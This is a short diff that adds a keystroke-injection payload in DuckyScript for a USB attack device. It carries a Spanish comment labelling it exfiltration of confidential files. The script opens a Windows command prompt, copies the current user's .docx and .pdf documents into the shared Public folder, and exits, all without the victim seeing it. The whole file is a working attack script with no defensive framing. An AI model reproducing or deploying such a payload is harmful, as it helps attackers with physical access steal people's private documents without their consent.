@@ -1,0 +1,13 @@
+REM Exfiltración de archivos confidenciales
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING copy C:\Users\%USERNAME%\Documents\*.docx C:\Users\Public
+ENTER
+STRING copy C:\Users\%USERNAME%\Documents\*.pdf C:\Users\Public
+ENTER
+STRING exit
+ENTER
